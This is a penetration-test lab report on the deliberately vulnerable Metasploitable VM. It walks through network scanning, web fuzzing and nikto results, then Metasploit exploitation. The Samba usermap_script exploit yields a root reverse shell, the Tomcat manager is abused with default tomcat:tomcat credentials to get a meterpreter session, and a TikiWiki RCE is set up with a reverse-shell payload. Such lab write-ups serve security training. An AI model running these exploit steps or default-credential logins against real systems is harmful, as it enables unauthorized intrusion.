---
title: "Vulnhub-Metasploitable"
author: ["lovehamethyst@gmail.com", "OSID: 123456"]
date: "2023-09-07"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "OSCP Exam Report"
lang: "en"
titlepage: true
titlepage-color: "1E90FF"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize

---

# Vulnhub-Metasploitable-Report

author:h4m5t

date:2023/9/7

attacker:kali2023.3   192.168.76.150

target machine:Metasploitable   192.168.76.151

host machine:win10  

Network:NAT



# Information Gathering

## Search IP

```
# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d1:18:a8, IPv4: 192.168.76.150
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.76.1    00:50:56:c0:00:08       VMware, Inc.
192.168.76.2    00:50:56:e4:44:56       VMware, Inc.
192.168.76.151  00:0c:29:0f:96:24       VMware, Inc.
192.168.76.254  00:50:56:e7:f4:d9       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.114 seconds (121.10 hosts/sec). 4 responded
```

## port scanning

```
# nmap -sV 192.168.76.151
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 05:11 EDT
Nmap scan report for 192.168.76.151
Host is up (0.00071s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.1
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 00:0C:29:0F:96:24 (VMware)
Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.76 seconds
```

## directory fuzzing

```
# python dirsearch.py -u http://192.168.76.151
Missing required dependencies to run.
Do you want dirsearch to automatically install them? [Y/n] Y
Installing required dependencies...

  _|. _ _  _  _  _ _|_    v0.4.3                                                                     
 (_||| _) (/_(_|| (_| )                                                                              
                                                                                                     
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11714

Output: /home/kali/Desktop/dirsearch/reports/http_192.168.76.151/_23-09-07_05-18-26.txt

Target: http://192.168.76.151/

[05:18:26] Starting:                                                                                 
[05:18:35] 403 -  333B  - /.ht_wsr.txt                                      
[05:18:35] 403 -  336B  - /.htaccess.bak1                                   
[05:18:36] 403 -  336B  - /.htaccess.orig                                   
[05:18:36] 403 -  338B  - /.htaccess.sample                                 
[05:18:36] 403 -  336B  - /.htaccess.save
[05:18:36] 403 -  337B  - /.htaccess_extra                                  
[05:18:36] 403 -  336B  - /.htaccess_orig
[05:18:36] 403 -  334B  - /.htaccessBAK
[05:18:36] 403 -  326B  - /.htm                                             
[05:18:36] 403 -  327B  - /.html
[05:18:36] 403 -  334B  - /.htaccess_sc                                     
[05:18:36] 403 -  334B  - /.htaccessOLD
[05:18:36] 403 -  336B  - /.htpasswd_test                                   
[05:18:36] 403 -  332B  - /.htpasswds
[05:18:36] 403 -  333B  - /.httr-oauth
[05:18:36] 403 -  335B  - /.htaccessOLD2                                    
[05:19:36] 403 -  330B  - /cgi-bin/                                         
[05:19:50] 403 -  326B  - /doc/                                             
[05:19:50] 403 -  330B  - /doc/api/
[05:19:50] 403 -  341B  - /doc/html/index.html
[05:19:50] 403 -  340B  - /doc/stable.version
[05:19:50] 403 -  341B  - /doc/en/changes.html                              
[05:20:35] 200 -   48KB - /phpinfo                                          
[05:20:35] 200 -   47KB - /phpinfo.php
[05:20:51] 403 -  335B  - /server-status                                    
[05:20:51] 403 -  336B  - /server-status/
[05:21:06] 301 -  359B  - /tikiwiki  ->  http://192.168.76.151/tikiwiki/    
                                                                             
Task Completed                                                                           
```

## vulnerability scanning

```
# nikto -h 192.168.76.151
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.76.151
+ Target Hostname:    192.168.76.151
+ Target Port:        80
+ Start Time:         2023-09-07 06:47:23 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
+ /: Server may leak inodes via ETags, header found with file /, inode: 67575, size: 45, mtime: Wed Mar 17 10:08:25 2010. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.2.4-2ubuntu5.10 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ PHP/5.2 - PHP 3/4/5 and 7.0 are End of Life products without support.
+ /phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.
+ /phpinfo.php: Output from the phpinfo() function was found.
+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://blog.cirt.net/rfiinc.txt: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /tikiwiki/tiki-graph_formula.php: Output from the phpinfo() function was found.
+ /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=http://blog.cirt.net/rfiinc.txt: TikiWiki contains a vulnerability which allows remote attackers to execute arbitrary PHP code. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5423
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8909 requests: 1 error(s) and 19 item(s) reported on remote host
+ End Time:           2023-09-07 06:48:01 (GMT-4) (38 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```



# Methodologies

## Solution 1:SMB

```
msf6 > search samba

Matching Modules
================

   #   Name                                                 Disclosure Date  Rank       Check  Description
   -   ----                                                 ---------------  ----       -----  -----------
   0   exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
   1   exploit/windows/license/calicclnt_getconfig          2005-03-02       average    No     Computer Associates License Client GETCONFIG Overflow
   2   exploit/unix/misc/distcc_exec                        2002-02-01       excellent  Yes    DistCC Daemon Command Execution
   3   exploit/windows/smb/group_policy_startup             2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
   4   post/linux/gather/enum_configs                                        normal     No     Linux Gather Configurations
   5   auxiliary/scanner/rsync/modules_list                                  normal     No     List Rsync Modules
   6   exploit/windows/fileformat/ms14_060_sandworm         2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
   7   exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
   8   exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba "username map script" Command Execution
   9   exploit/multi/samba/nttrans                          2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   10  exploit/linux/samba/setinfopolicy_heap               2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   11  auxiliary/admin/smb/samba_symlink_traversal                           normal     No     Samba Symlink Directory Traversal
   12  auxiliary/scanner/smb/smb_uninit_cred                                 normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   13  exploit/linux/samba/chain_reply                      2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   14  exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
   15  auxiliary/dos/samba/lsa_addprivs_heap                                 normal     No     Samba lsa_io_privilege_set Heap Overflow
   16  auxiliary/dos/samba/lsa_transnames_heap                               normal     No     Samba lsa_io_trans_names Heap Overflow
   17  exploit/linux/samba/lsa_transnames_heap              2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   18  exploit/osx/samba/lsa_transnames_heap                2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   19  exploit/solaris/samba/lsa_transnames_heap            2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   20  auxiliary/dos/samba/read_nttrans_ea_list                              normal     No     Samba read_nttrans_ea_list Integer Overflow
   21  exploit/freebsd/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
   22  exploit/linux/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
   23  exploit/osx/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
   24  exploit/solaris/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
   25  exploit/windows/http/sambar6_search_results          2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow


Interact with a module by name or index. For example info 25, use 25 or use exploit/windows/http/sambar6_search_results

msf6 > use 8
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > set rhosts 192.168.76.151
rhosts => 192.168.76.151
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 192.168.76.150:4444 
[*] Command shell session 1 opened (192.168.76.150:4444 -> 192.168.76.151:47002) at 2023-09-07 20:45:36 -0400

whoami
root
```



## Solution 2:tomcat

open the default management page: http://192.168.76.151:8180/manager/html

login with tomcat:tomcat

```
msf6 > exploit/multi/http/tomcat_mgr_deploy
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_deploy) > show options 

Module options (exploit/multi/http/tomcat_mgr_deploy):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   PATH          /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.76.150   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/tomcat_mgr_deploy) > set rhosts 192.168.76.151
rhosts => 192.168.76.151
msf6 exploit(multi/http/tomcat_mgr_deploy) > set rport 8180
rport => 8180

msf6 exploit(multi/http/tomcat_mgr_deploy) > set httppassword tomcat
httppassword => tomcat
msf6 exploit(multi/http/tomcat_mgr_deploy) > set httpusername tomcat
httpusername => tomcat
msf6 exploit(multi/http/tomcat_mgr_deploy) > show options

Module options (exploit/multi/http/tomcat_mgr_deploy):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  tomcat           no        The password for the specified username
   HttpUsername  tomcat           no        The username to authenticate as
   PATH          /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        192.168.76.151   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT         8180             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.76.150   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


View the full module info with the info, or info -d command.

msf6 exploit(multi/http/tomcat_mgr_deploy) > exploit

[*] Started reverse TCP handler on 192.168.76.150:4444 
[*] Attempting to automatically select a target...
[*] Automatically selected target "Linux x86"
[*] Uploading 6215 bytes as cPjs.war ...
[*] Executing /cPjs/Am4YL0em6zTSnvxgojz0DR3XZKh.jsp...
[*] Undeploying cPjs ...
[*] Sending stage (58829 bytes) to 192.168.76.151
[*] Meterpreter session 1 opened (192.168.76.150:4444 -> 192.168.76.151:57385) at 2023-09-07 21:40:55 -0400

meterpreter > whoami
[-] Unknown command: whoami
meterpreter > getuid
Server username: tomcat55
```



# Additional Items

```
http://192.168.76.151/tikiwiki/tiki-index.php
```

Try the weak password admin,admin log in. You need to change the password after the login.

```
msf6 > search tikiwiki

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/unix/webapp/php_xmlrpc_eval              2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
   1  exploit/unix/webapp/tikiwiki_upload_exec         2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   2  exploit/unix/webapp/tikiwiki_unserialize_exec    2012-07-04       excellent  No     Tiki Wiki unserialize() PHP Code Execution
   3  auxiliary/admin/tikiwiki/tikidblib               2006-11-01       normal     No     TikiWiki Information Disclosure
   4  exploit/unix/webapp/tikiwiki_jhot_exec           2006-09-02       excellent  Yes    TikiWiki jhot Remote Command Execution
   5  exploit/unix/webapp/tikiwiki_graph_formula_exec  2007-10-10       excellent  Yes    TikiWiki tiki-graph_formula Remote PHP Code Execution


Interact with a module by name or index. For example info 5, use 5 or use exploit/unix/webapp/tikiwiki_graph_formula_exec

msf6 > use 5
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/tikiwiki_graph_formula_exec) > show options 

Module options (exploit/unix/webapp/tikiwiki_graph_formula_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /tikiwiki        yes       TikiWiki directory path
   VHOST                     no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.76.150   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```



```
msf6 exploit(unix/webapp/tikiwiki_graph_formula_exec) > set RHOST 192.168.76.151
RHOST => 192.168.76.151
msf6 exploit(unix/webapp/tikiwiki_graph_formula_exec) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/generic/custom                                       normal  No     Custom Payload
   1   payload/generic/shell_bind_aws_ssm                           normal  No     Command Shell, Bind SSM (via AWS API)
   2   payload/generic/shell_bind_tcp                               normal  No     Generic Command Shell, Bind TCP Inline
   3   payload/generic/shell_reverse_tcp                            normal  No     Generic Command Shell, Reverse TCP Inline
   4   payload/generic/ssh/interact                                 normal  No     Interact with Established SSH Connection
   5   payload/multi/meterpreter/reverse_http                       normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
   6   payload/multi/meterpreter/reverse_https                      normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
   7   payload/php/bind_perl                                        normal  No     PHP Command Shell, Bind TCP (via Perl)
   8   payload/php/bind_perl_ipv6                                   normal  No     PHP Command Shell, Bind TCP (via perl) IPv6
   9   payload/php/bind_php                                         normal  No     PHP Command Shell, Bind TCP (via PHP)
   10  payload/php/bind_php_ipv6                                    normal  No     PHP Command Shell, Bind TCP (via php) IPv6
   11  payload/php/download_exec                                    normal  No     PHP Executable Download and Execute
   12  payload/php/exec                                             normal  No     PHP Execute Command
   13  payload/php/meterpreter/bind_tcp                             normal  No     PHP Meterpreter, Bind TCP Stager
   14  payload/php/meterpreter/bind_tcp_ipv6                        normal  No     PHP Meterpreter, Bind TCP Stager IPv6
   15  payload/php/meterpreter/bind_tcp_ipv6_uuid                   normal  No     PHP Meterpreter, Bind TCP Stager IPv6 with UUID Support
   16  payload/php/meterpreter/bind_tcp_uuid                        normal  No     PHP Meterpreter, Bind TCP Stager with UUID Support
   17  payload/php/meterpreter/reverse_tcp                          normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   18  payload/php/meterpreter/reverse_tcp_uuid                     normal  No     PHP Meterpreter, PHP Reverse TCP Stager
   19  payload/php/reverse_perl                                     normal  No     PHP Command, Double Reverse TCP Connection (via Perl)
   20  payload/php/reverse_php                                      normal  No     PHP Command Shell, Reverse TCP (via PHP)

msf6 exploit(unix/webapp/tikiwiki_graph_formula_exec) > set payload payload/generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
```

